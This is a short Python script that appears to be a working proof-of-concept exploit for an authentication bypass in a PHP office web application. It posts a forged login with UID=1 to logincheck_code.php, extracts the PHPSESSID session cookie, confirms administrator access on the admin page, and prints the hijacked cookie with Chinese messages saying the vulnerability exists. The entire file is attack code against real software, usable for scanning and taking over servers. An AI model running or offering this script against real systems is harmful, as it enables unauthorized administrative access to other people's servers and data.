import eventlet
import requests
import re
import sys

def start(argv):
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; PCRT00 Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.158 Safari/537.36 fanwe_app_sdk sdk_type/android sdk_version_name/4.0.1 sdk_version/2020042901 screen_width/720 screen_height/1280'}
    data = {'UNAME':'aka','PASSWORD':'akaaka','encode_type':'1','UID':'1'}
    eventlet.monkey_patch()
    with eventlet.Timeout(2, False):
        try:
            url1 = 'http://'+argv[1]+'/logincheck_code.php'
            url2 = 'http://'+argv[1]+'/general/index.php'
            a = requests.get(url=url1, headers=headers1, verify=False)
            if '200' == str(a.status_code):
                if 1 == a.json()['status']:
                    c = requests.post(url=url1,headers=headers1,data=data,verify=False).headers['Set-Cookie']
                    re1 = r'=(.*?);'
                    reallyc = re.findall(re1, c)
                    headers2 = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1","Cookie":"PHPSESSID="+reallyc[0]}
                    b = requests.get(url2, headers=headers2, verify=False)
                    if "系统管理员" in b.text:
                        print('[+]漏洞存在  ',argv[1],'| cookie为: '+reallyc[0])
                    else:
                        print('[-]漏洞不存在')
                else:
                    print("[-]漏洞不存在")
            else:
                print("[-]漏洞不存在或页面响应非200")
        except :
                print("抛出异常")
if __name__ == '__main__':
    try:
        start(sys.argv)
    except :
        print("程序异常")